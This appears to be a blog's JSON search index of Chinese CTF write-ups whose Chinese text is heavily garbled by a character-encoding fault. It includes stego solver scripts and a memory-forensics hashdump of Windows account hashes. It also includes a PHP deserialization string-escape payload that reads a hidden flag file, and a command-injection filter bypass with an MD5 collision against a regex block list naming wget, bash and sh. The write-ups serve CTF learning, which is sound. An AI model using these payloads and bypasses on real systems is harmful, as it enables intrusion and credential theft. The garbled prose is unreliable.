asc+=str(0) #è¿™æ˜¯è¯†åˆ«äºŒç»´ç çš„æ–¹æ³• # if content==&quot;one&quot;: # asc+=str(1) # except: # pass size=os.path.getsize(str(i)+&quot;.png&quot;) #è¿™æ˜¯ä½¿ç”¨filesizeåšçš„æ–¹æ³• if size==3409: asc+=&#x27;0&#x27; else: asc+=&#x27;1&#x27;asc=int(asc,base=2)print(asc)asc=hex(asc)asc=asc[2:]print(binascii.a2b_hex(asc).decode()) flag{duyoulikeit} relaxæ‰“å¼€æ˜¯ä¸ª.flagç»“å°¾çš„æ–‡ä»¶ï¼Œä¸¢è¿›010editorçœ‹è§æ˜¯PKå¼€å¤´ï¼Œè€ƒè™‘zipï¼Œè§£å‹å‡ºæ¥ä¸€ä¸ªflag.txt ä¸€ä¸ªéŸ³é¢‘ã€‚ flagtxté‡Œé¢çš„base64è§£å‡ºæ¥å•¥ä¹Ÿä¸æ˜¯ï¼Œäºæ˜¯ç»§ç»­çœ‹éŸ³é¢‘ã€‚ è€ƒè™‘éŸ³é¢‘éšå†™ï¼Œåœ¨æ–‡ä»¶è¯¦ç»†ä¿¡æ¯é‡Œé¢å‘ç°äº†ä¸€ä¸²base64,è§£ç åæ‰“å¼€mp3stegoï¼Œè¾“å…¥è¿™ä¸ªå¯†ç ï¼Œå¾—åˆ°äº†ä¸€ä¸²fakeflagï¼š fakeflag{same_length_with_true_flaghh} å’ŒçœŸçš„é•¿çš„ä¸€æ ·å‘¢ï¼ŒçœŸçœŸå‡å‡ åé¢å°±æ²¡æ€è·¯äº†ã€‚ åæ¥çœ‹å¸ˆå‚…çš„wpè¯´éœ€è¦è®²è¯¥å­—ç¬¦ä¸²ä¸ä¹‹å‰è§£å‡ºæ¥å•¥ä¹Ÿä¸æ˜¯çš„base64å¼‚æˆ–å°±å¯ä»¥å¾—åˆ°flagã€‚è‰ã€‚ ä¸Šè„šæœ¬ï¼š 12345678910import base64with open(&quot;flag.txt&quot;) as f: str1=f.readline()str1=base64.b64decode(str1)fakeflag=&quot;fakeflag&#123;same_length_with_true_flaghh&#125;&quot;.encode()flag=&quot;&quot;for i in range (len(fakeflag)): tmp=fakeflag[i]^str1[i] flag+=chr(tmp)print( flag) è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šencode()æ–¹æ³•æ˜¯strç±»å‹æä¾›çš„ï¼Œå°†å…¶è½¬æ¢ä¸ºbyteç±»å‹ã€‚decodeï¼ˆï¼‰æ–¹æ³•æ˜¯å°†byteç±»å‹è½¬åŒ–ä¸ºstrç±»å‹ã€‚ä¹‹å‰æˆ‘éƒ½æ˜¯å‡ºé”™äº†å°±ç›´æ¥çencodeï¼Œdecodeï¼Œå’‹å¯¹å’‹å¼„ã€‚ã€‚ä»Šå¤©ç»ˆäºçŸ¥é“äº†ã€‚ flagï¼šflag{9ff3a239027a7089237686b384862d33} base64base64å¥—å¨ƒï¼Œå…‰æƒ³ç€basecrackï¼Œç»“æœç›´æ¥å¡æ­»ã€‚ã€‚å°±æ˜¯æ²¡æƒ³èµ·æ¥è‡ªå·±å†™è„šæœ¬ã€‚ é™„ä¸Šhxdçš„è„šæœ¬ 1234567891011121314151617181920212223242526272829import base64with open (&quot;base.txt&quot;,&quot;rb&quot;) as f: content=f.read()while True: try: content=base64.b16decode(content).decode() print(&quot;b16&quot;) print(content) except: try: content=base64.b32decode(content).decode() print(&quot;b32&quot;) print(content) except: try: content=base64.b64decode(content).decode() print(&quot;b64&quot;) print(content) except: try: content=base64.b85decode(content).decode() print(&quot;b85&quot;) print(content) except: break; flag:flag{4b057431c3ee0c4f56d4dad18c352375}","categories":[],"tags":[]},{"title":"å–è¯ä¸“é¢˜","slug":"å–è¯ä¸“é¢˜","date":"2020-11-17T03:49:09.000Z","updated":"2020-11-17T04:32:36.606Z","comments":true,"path":"2020/11/17/å–è¯ä¸“é¢˜/","link":"","permalink":"https://polosec.github.io/2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/","excerpt":"","text":"å–è¯éœ€è¦ç”¨åˆ°çš„å·¥å…·ï¼š volatilityã€æ³¨å†Œè¡¨åˆ†æå·¥å…·ï¼ˆWRRï¼‰ã€AXIOMç­‰ã€‚ ä¾‹é¢˜åˆ†ææ¹–æ¹˜æ¯miscé¦–å…ˆçœ‹ä¸€ä¸‹imageinfo 1volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem imageinfo é€‰æ‹©ä¸€ä¸ªsupported profileï¼Œè¿™é‡Œé€‰ç¬¬ä¸€ä¸ªä¸è¡Œï¼Œæ‰€ä»¥é€‰ç¬¬äºŒä¸ªWin2003SP2x86 å…ˆæ‰«ä¸€ä¸‹pslist volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem â€“profile=Win2003SP2x86 pslist é™¤äº†winlogon.exeä¹‹å¤–æ²¡å•¥æ”¶è·ï¼Œç„¶åæ‰«ä¸€ä¸‹ç½‘ç»œï¼Œä¹Ÿæ²¡å•¥æ”¶è·ã€‚ åé¢å°è¯•æ‰«æconnscanï¼Œcmdscanï¼Œnotepadã€‚ åœ¨æ‰«notepadçš„æ—¶å€™å‘ç°äº†ä¸€äº›ä¸œè¥¿ï¼Œäºæ˜¯å°è¯•æ‰«ä¸€ä¸‹åç¼€ä¸º.txtçš„æ–‡ä»¶ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æ”¶è·ã€‚ å‘ç°äº†ä¸€ä¸ªfile.txtï¼Œå°è¯•dumpåˆ°æœ¬åœ°ã€‚ 1volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem --profile&#x3D;Win2003SP2x86 dumpfiles -Q 0x000000000412cde0 -D .&#x2F; dumpä¸‹æ¥çš„æ–‡ä»¶å†…å®¹ä¸º ä»€ä¹ˆï¼Ÿè®¡ç®—æœºåˆè¢«ä¸çŸ¥åè´¦æˆ·ç™»å½•äº†ï¼Ÿæ˜æ˜åœ¨è®¡ç®—æœºç®¡ç†ä¸­æ²¡æœ‰è¿™ä¸ªç”¨æˆ·ï¼Œä¸ºä»€ä¹ˆè¿˜ä¼šè¢«è¿™ä¸ªç”¨æˆ·ç™»å½•å‘¢ï¼Ÿç”µè„‘è·Ÿå‰çš„ä½ èƒ½å¸®æˆ‘æ‰¾åˆ°åŸå› å—ï¼Ÿflagä¸ºè¯¥ç”¨æˆ·çš„ç”¨æˆ·åä»¥åŠå¯†ç çš„md5å€¼ã€‚ æ ¼å¼ï¼šmd5(ç”¨æˆ·å:å¯†ç ï¼‰ ä¸‹é¢è€ƒè™‘åœ¨æ³¨å†Œè¡¨ä¸­æ‰¾ä¸€ä¸‹éšè—ç”¨æˆ·ã€‚ é¦–å…ˆçœ‹ä¸€ä¸‹æ³¨å†Œè¡¨ã€‚ 1volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem --profile&#x3D;Win2003SP2x86 hivelist volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem --profile&#x3D;Win2003SP2x86 hivelist å‘ç°äº†SAMè¡¨ã€‚SAMè¡¨æ˜¯å­˜å‚¨äº†ç”µè„‘ç™»å½•ç”¨æˆ·ç›¸å…³ä¿¡æ¯çš„è¡¨ï¼Œå°è¯•dumpå‡ºSAMè¡¨ã€‚ 1volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem --profile&#x3D;Win2003SP2x86 dumpregistry -D .&#x2F; ç„¶åä½¿ç”¨æ³¨å†Œè¡¨åˆ†æå·¥å…·æ‰“å¼€ã€‚ å¯ä»¥çœ‹åˆ°å¾ˆå¤šéšè—è´¦æˆ·ï¼Œä¸€ä¸ªä¸ªçœ‹çœ‹æ˜¯å¦æœ‰last logon è¿™ä¸ªå±æ€§ã€‚ æœ€åæ‰¾åˆ°äº†ç”¨æˆ· FHREhpeï¼Œç„¶åå†å›åˆ°volatilityé‡Œé¢hashdump å‡ºæ¥å…³äºä»–çš„è´¦å·å¯†ç ã€‚ 123volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem --profile&#x3D;Win2003SP2x86 hashdump | grep FHREhpeæœ‰å¦‚ä¸‹æ•°æ®ï¼šFHREhpe$:1171:70fdb8f853bd427d7584248b8d2c9f9e:f3cf477fc3ea6ec0b3b5887616dd4506::: Windowsç³»ç»Ÿä¸‹çš„hashå¯†ç æ ¼å¼ä¸ºï¼šç”¨æˆ·åç§°*:RID:LM-HASHå€¼:NT-HASH*å€¼ è·å¾—NT HASHå€¼åå¯ä»¥å»md5ç½‘ç«™è§£å¯†ï¼Œè§£å¯†åçš„å¯†ç æ˜¯NIAIWOMA ç„¶åå°†å…¶MD5åŠ å¯†åå³å¯è·å¾—flagã€‚ å‚è€ƒé“¾æ¥https://bbs.ichunqiu.com/thread-59102-1-1.html https://www.sqlsec.com/2019/11/winhash.html","categories":[],"tags":[{"name":"å–è¯","slug":"å–è¯","permalink":"https://polosec.github.io/tags/%E5%8F%96%E8%AF%81/"}]},{"title":"1104å­¦ä¹ ç¬”è®°","slug":"1104å­¦ä¹ ç¬”è®°","date":"2020-11-09T08:52:34.000Z","updated":"2020-11-09T08:54:26.221Z","comments":true,"path":"2020/11/09/1104å­¦ä¹ ç¬”è®°/","link":"","permalink":"https://polosec.github.io/2020/11/09/1104%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"pythonæ–‡ä»¶åç¼–è¯‘103F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000 ä½¿ç”¨010editorç¼–è¾‘ï¼Œpaste from hexï¼Œç„¶åå¦å­˜ä¸º1.pycã€‚pythonå®‰è£…uncompyle , pip install uncompyleä¸‹é¢å°±æ˜¯ uncompyle 1.pyc&gt;1.py 123456789def flag(): str = [ 102, 108, 97, 103, 123, 51, 56, 97, 53, 55, 48, 51, 50, 48, 56, 53, 52, 52, 49, 101, 55, 125] flag = &#x27;&#x27; for i in str: flag += chr(i) print flagflag() è¿è¡Œå³å¯è·å¾—flag base64éšå†™è§£å¯†è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435def get_base64_diff_value(s1, s2): base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27; res = 0 for i in xrange(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open(&#x27;1.txt&#x27;, &#x27;rb&#x27;) as f: file_lines = f.readlines() bin_str = &#x27;&#x27; for line in file_lines: steg_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) norm_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;) diff = get_base64_diff_value(steg_line, norm_line) print diff pads_num = steg_line.count(&#x27;=&#x27;) if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += &#x27;0&#x27; * pads_num * 2 print goflag(bin_str)def goflag(bin_str): res_str = &#x27;&#x27; for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == &#x27;__main__&#x27;: solve_stego() ç›´æ¥è¾“å…¥base64éšå†™åçš„å†…å®¹å³å¯","categories":[],"tags":[]},{"title":"ååºåˆ—åŒ–ä¸“é¢˜","slug":"ååºåˆ—åŒ–ä¸“é¢˜","date":"2020-11-03T11:54:08.000Z","updated":"2020-11-09T08:51:56.266Z","comments":true,"path":"2020/11/03/ååºåˆ—åŒ–ä¸“é¢˜/","link":"","permalink":"https://polosec.github.io/2020/11/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/","excerpt":"","text":"æœ€è¿‘å¯¹ååºåˆ—åŒ–äº§ç”Ÿäº†ä¸€äº›å…´è¶£ï¼Œæ‰€ä»¥å¼€æ­¤ç¯‡å†…å®¹è®°å½•æ‰€é‡åˆ°çš„ååºåˆ—åŒ–çš„é—®é¢˜ã€‚å®‰æ´µæ¯ easy_serialize_phpé¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123; $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;; return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123; echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123; $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123; $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123; highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123; eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123; $userinfo &#x3D; unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125; é¢˜ç›®åˆ†æå¤§æ¦‚çš„æµç¨‹æ˜¯ä»æµè§ˆå™¨æ¥å—GETæ–¹å¼çš„functionï¼Œæ ¹æ®æç¤ºåœ¨phpinfoé‡Œé¢æœ‰ä¸œè¥¿ã€‚ è¿›å…¥phpinfoåæœç´¢å¾—åˆ° d0g3_f1ag.phpè¿™ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯çŒœæµ‹éœ€è¦é€šè¿‡ååºåˆ—åŒ–æ„é€ æ‰§è¡Œè‡³ç¨‹åºæœ€åä¸€è¡Œçš„file_get_contnets(). é‚£ä¹ˆçœ‹file_get_contents()æ˜¯å¯¹ ç»è¿‡æ»¤åã€åºåˆ—åŒ–åçš„serialize_infoçš„ååºåˆ—åŒ–å–å…¶imgå±æ€§çš„ç»“æœã€‚ å…ˆä¸ç®¡æ­£åˆ™è¿‡æ»¤ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯æ„é€ ä¸€ä¸ªè¾“å…¥ï¼Œè®©imgçš„valueä¸ºbase64åŠ å¯†åçš„d0g3_f1ag.phpã€‚ ç›®æ ‡ç»“æœå¦‚ä¸‹ï¼š 1a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:14:&quot;highlight_file&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; ä½†æ˜¯æ­£å¸¸è¾“å…¥çš„è¯æˆ‘ä»¬æ˜¯æ— æ³•ç»•è¿‡ img_path çš„åˆ¤å®šçš„ã€‚ æ‰€ä»¥è¿™é‡Œæ ¹æ®è¿‡æ»¤å…¥æ‰‹ï¼Œæ ¹æ®æ­£åˆ™è¡¨è¾¾å¼ä»¥åŠpreg_repaceæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå°†ä¸€äº›å…³é”®å­—æ›¿æ¢æˆäº†æ— ï¼Œå³å»æ‰ã€‚ è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨POSTæ–¹æ³•ï¼Œå¯¹_SESSION[]æ•°ç»„ä¼ å‚ï¼Œä¼ å…¥çš„keyä¸ºé»‘åå•çš„å€¼ï¼Œè¿™æ ·åœ¨åºåˆ—åŒ–å®Œä¹‹åä¼šåƒæ‰è¯¥keyçš„éƒ¨åˆ†valueã€‚ å¬ä¸æ‡‚æ­£å¸¸ï¼Œä¸€å¼€å§‹æˆ‘ä¹Ÿå¬ä¸æ‡‚ï¼Œæˆ‘å°±ä¸åƒå…¶ä»–åšä¸»ä¸€æ ·ç»™ä½ ç”¨ä¸åŒçš„é¢œè‰²æ ‡å‡ºæ¥å“ªé‡Œæ˜¯åƒæ‰çš„éƒ¨åˆ†äº†ã€‚ é¦–å…ˆè¦äº†è§£phpåºåˆ—åŒ–åçš„è¯­æ³•ï¼ˆè¿™é‡Œä¸èµ˜è¿°ï¼‰ æˆ‘ä»¬å…ˆéšä¾¿å†™å†™ï¼Œå…ˆPOSTä¸ª_SESSION[flag]=s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;} çœ‹çœ‹ç»“æœæ˜¯ä»€ä¹ˆï¼ˆæŠŠä»£ç æ‹·è´åˆ°æœ¬åœ°ï¼Œç„¶åæœ¬åœ°è¿è¡Œï¼Œechoæˆ–è€…var_dumpå‡ºæ¥åºåˆ—åŒ–åçš„ç»“æœï¼‰ï¼š a:2:{s:4:â€â€;s:39:â€s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw==â€;}â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw==â€;} ä½†æ˜¯è¿™æ ·æ˜¯ä¸èƒ½æ­£å¸¸ååºåˆ—åŒ–çš„ï¼Œå› ä¸ºä¸ç¬¦åˆååºåˆ—åŒ–çš„è¯­æ³•è§„åˆ™ã€‚æ ¹æ®è¯­æ³•è§„åˆ™çŸ¥é“ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è®©imgä½œä¸ºkeyï¼Œbase64åŠ å¯†åçš„ä¸œè¥¿ä½œä¸ºvalueçš„è¯ï¼Œéœ€è¦è®©ä¸Šä¸€ä¸ªå¯¹è±¡æ˜¯æ­£å¸¸çš„ï¼Œç¬¦åˆåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²çš„è¯­æ³•ã€‚ ä»å‰å¾€åçœ‹ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡çš„keyä¸º**â€;s:**ï¼Œè¿™æ ·ä¼šå¯¼è‡´åé¢çš„å­—ç¬¦ä¸²æ— æ³•æ­£å¸¸åœ°ååºåˆ—åŒ–ã€‚ æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥éœ€è¦åšçš„æ˜¯å…ˆæŠŠç¬¬ä¸€ä¸ªå¯¹è±¡çš„keyå’Œvalueè¡¥å…¨ï¼Œè®©å…¶èƒ½æ­£å¸¸åœ°ååºåˆ—åŒ–ã€‚ è¡¥å…¨ç¬¬ä¸€ä¸ªkeyçš„è¯ï¼Œéœ€è¦è®©ç¬¬ä¸€ä¸ªkeyä¸º**â€;s:39:â€**ï¼Œæ‰€ä»¥éœ€è¦åœ¨POSTé‡Œé¢ä¼ å…¥_SESSION[flagflag]ï¼Œè¿™æ ·èƒ½åæ‰å…«ä¸ªä½ç½®ã€‚æ­£å¥½èƒ½è®©æœ¬æ®µè¯åŠ ç²—çš„å†…å®¹ä½œä¸ºç¬¬ä¸€ä¸ªkeyï¼ˆè¿™é‡Œå»ºè®®è‡ªå·±å†™å†™è¯•è¯•ï¼Œçœ‹çœ‹æ˜¯å¦ç¬¦åˆååºåˆ—åŒ–è¯­æ³•çš„è§„åˆ™ã€‚ï¼‰ è¡¥å…¨ä¹‹åè¯·å¤§å®¶è‡ªå·±var_dumpæˆ–è€…è¾“å‡ºï¼Œæˆ‘è¿™é‡Œä¸ä¼šç»™å‡ºè¡¥å…¨åè¾“å‡ºçš„åºåˆ—åŒ–ç»“æœã€‚ è¡¥å…¨åå‘ç°ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡å¯ä»¥æ­£å¸¸åºåˆ—åŒ–äº†ï¼Œä½†æ˜¯é—®é¢˜å°±æ˜¯ç¬¬äºŒä¸ªå¯¹è±¡çš„keyæˆäº†ç¬¬ä¸€ä¸ªå¯¹è±¡çš„valueã€‚ æ‰€ä»¥è¿™é‡Œéœ€è¦ç»™ç¬¬ä¸€ä¸ªå¯¹è±¡è¡¥ä¸ªkeyï¼Œç»™_SESISON[flagflag]ç»§ç»­ä¼ å€¼å°±å¯ä»¥ï¼Œå…·ä½“ä¼ ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·ä¼ ï¼Œæˆ‘ä¹Ÿä¸ä¼šè¯´ã€‚æ€»ä¹‹æˆ‘ä»¬çš„ç›®çš„æ˜¯ä¼ ä¸€ä¸ªç¬¦åˆåºåˆ—åŒ–æ ¼å¼çš„valueï¼Œå¹¶ä¸”ä¼ å…¥åä¹Ÿéœ€è¦è®©å‰åéƒ½ç¬¦åˆåºåˆ—åŒ–æ ¼å¼ã€‚ éšä¾¿å†™ä¸€ä¸ªå°±å¥½ æ¯”å¦‚ s:3:â€aaaâ€; é¦–å…ˆä½ æŠŠä»–å†™è¿›å»ï¼Œç„¶åæ ¹æ®åºåˆ—åŒ–æ ¼å¼åœ¨å‰åæ·»åŠ ç›¸å…³ç¬¦å·ã€‚è¿åŒåˆšæ‰å†™çš„s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}ä¸€èµ·å°±æ˜¯_SESSION[flagflag]= s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;} ç°åœ¨æ”¾è¿›å»çœ‹çœ‹æ˜¯ä»€ä¹ˆæ•ˆæœã€‚æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸ååºåˆ—åŒ– a:2:{s:8:â€â€;s:46:â€s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw==â€;} è¿™æ ·å‘ç°è¿˜æ˜¯ä¸èƒ½æ­£å¸¸åœ°ååºåˆ—åŒ–ï¼Œå› ä¸ºä¸ç¬¦åˆè¯­æ³•ã€‚åœ¨s:3å‰ç¼ºå°‘ä¸Šä¸€ä¸ªå­—æ®µçš„é—­åˆâ€; åŠ ä¸Šå°±å¥½ã€‚ æ‰€ä»¥æœ€ç»ˆçš„payloadå°±æ˜¯ _SESSION[flagflag]=â€;s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;} æ‰“è¿‡å»åæŸ¥çœ‹æºç ï¼Œå‘ç° 12345&lt;?php$flag = &#x27;flag in /d0g3_fllllllag&#x27;;?&gt; ä¸‹é¢ç»§ç»­æ‰“å¯¹åº”çš„æ–‡ä»¶å°±å¥½äº†~ _SESSION[flagflag]=â€;s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€L2QwZzNfZmxsbGxsbGFnâ€;} æ‰“è¿›å»å³å¯è·å¾—ä¸€æšflagã€‚","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://polosec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"å®‰æ´µæ¯web","slug":"å®‰æ´µæ¯web","date":"2020-10-30T16:11:37.000Z","updated":"2020-10-30T16:12:16.345Z","comments":true,"path":"2020/10/31/å®‰æ´µæ¯web/","link":"","permalink":"https://polosec.github.io/2020/10/31/%E5%AE%89%E6%B4%B5%E6%9D%AFweb/","excerpt":"","text":"è‡´è°¢https://www.cnblogs.com/Cl0ud/p/12585242.html é¢˜ç›®åˆ†ææ‰“å¼€é¢˜ç›®ï¼Œè§‚å¯ŸURLä¸ºhttp://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd= äºæ˜¯çŒœæµ‹æœ‰ä¸ªæ–‡ä»¶è¯»å–å’Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯æ–‡ä»¶è¯»å–çš„æ ¼å¼æ˜¯åŠ å¯†çš„ï¼Œè€ƒè™‘base64è§£å¯†ï¼Œè§£å¯†ä¸¤æ¬¡åå†hex2asciiï¼Œå¯ä»¥å¾—åˆ°æ–‡ä»¶åã€‚ copyå¤§ä½¬çš„è„šæœ¬ï¼Œè¾“å…¥æ–‡ä»¶åå³å¯å¾—åˆ°æ ¹æ®æ­¤åŠ å¯†è§„å¾‹åŠ å¯†åçš„æ–‡ä»¶åï¼š 123456789import binasciiimport base64filename = input().encode(encoding=&#x27;utf-8&#x27;)hex = binascii.b2a_hex(filename) #b2aæ˜¯è¿”å›äºŒè¿›åˆ¶æ•°æ®çš„16è¿›åˆ¶è¡¨ç¤ºprint(hex)base1 = base64.b64encode(hex)base2 = base64.b64encode(base1)print(base2.decode()) è¾“å…¥index.phpåå¯ä»¥å¾—åˆ°index.phpæ–‡ä»¶åçš„åŠ å¯†åçš„åå­—ï¼Œæ”¾åˆ°imgé‡Œé¢æŸ¥çœ‹æºä»£ç ä¸ºbase64åŠ å¯†çš„ï¼ŒæŠŠbase64è§£å¯†åå³å¯å¾—åˆ°index.phpçš„æºä»£ç  index.phpæºç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;?phphighlight_file(__FILE__);error_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);$cmd &#x3D; $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123; echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;; die(&quot;xixiï½ no flag&quot;);&#125; else &#123; $txt &#x3D; base64_encode(file_get_contents($file)); echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123; echo &quot;success&quot;; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt;&lt;html&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å¯¹æºç è¿›è¡Œå®¡è®¡ï¼Œé‡ç‚¹åœ¨å‘½ä»¤æ‰§è¡Œéƒ¨åˆ†ã€‚ å‘½ä»¤æ‰§è¡Œæœ‰å¾ˆå¤šè¿‡æ»¤ï¼Œè¿™é‡Œè¿‡æ»¤ä¸å®Œå…¨ï¼ˆæ­£åˆ™è¡¨è¾¾å¼æœ‰å¾…å­¦ä¹ ï¼‰ï¼Œå¯ç”¨ca\\t%20fl\\agç»•è¿‡ã€‚ åœ¨å‘½ä»¤æ‰§è¡Œå‰éœ€è¦æ»¡è¶³ 1if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) è¿™é‡Œå¯ä»¥è€ƒè™‘fastcollæ„é€ ä¸¤ä¸ªhashå€¼ç›¸åŒçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ æˆ‘è¿™é‡Œæ„é€ å¥½äº†ï¼Œå…·ä½“çš„ä½¿ç”¨æ–¹æ³•å¯ä»¥ç™¾åº¦fastcollã€‚ ä½¿ç”¨è¯¥è½¯ä»¶æ„é€ å¥½åï¼Œä½¿ç”¨å¦‚ä¸‹phpè„šæœ¬å¯ä»¥è·å¾—urlencodeåçš„md5å€¼ï¼š 12345678910111213141516171819&lt;?php function readmyfile($path)&#123; $fh &#x3D; fopen($path, &quot;rb&quot;); $data &#x3D; fread($fh, filesize($path)); fclose($fh); return $data;&#125;echo &#39;äºŒè¿›åˆ¶hash &#39;. md5( (readmyfile(&quot;1.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo 